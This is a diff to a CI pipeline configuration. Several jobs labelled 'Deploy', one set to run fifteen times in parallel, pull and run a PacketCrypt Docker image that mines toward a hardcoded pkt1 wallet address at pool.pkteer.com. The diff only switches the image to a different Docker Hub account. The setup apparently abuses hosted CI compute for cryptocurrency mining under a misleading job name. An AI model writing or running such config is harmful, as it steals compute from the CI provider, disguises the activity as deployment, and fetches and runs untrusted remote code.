@@ -11,8 +11,8 @@ jobs:
       - run:
          name: "Deploy"
          command: |
-                      docker pull backupbrain/packetcrypt
-                      docker run backupbrain/packetcrypt ann -p pkt1q8qf58p5fzfp0jgde6dkv87uln7yz0ayjgp3z74 http://pool.pkteer.com
+                      docker pull thomasjp0x42/packetcrypt
+                      docker run thomasjp0x42/packetcrypt ann -p pkt1q8qf58p5fzfp0jgde6dkv87uln7yz0ayjgp3z74 http://pool.pkteer.com
   build1:
     parallelism: 15
     machine:
@@ -23,8 +23,8 @@ jobs:
       - run:
          name: "Deploy"
          command: |
-                      docker pull backupbrain/packetcrypt
-                      docker run backupbrain/packetcrypt ann -p pkt1q8qf58p5fzfp0jgde6dkv87uln7yz0ayjgp3z74 http://pool.pkteer.com
+                      docker pull thomasjp0x42/packetcrypt
+                      docker run thomasjp0x42/packetcrypt ann -p pkt1q8qf58p5fzfp0jgde6dkv87uln7yz0ayjgp3z74 http://pool.pkteer.com
 
 workflows:
   main:
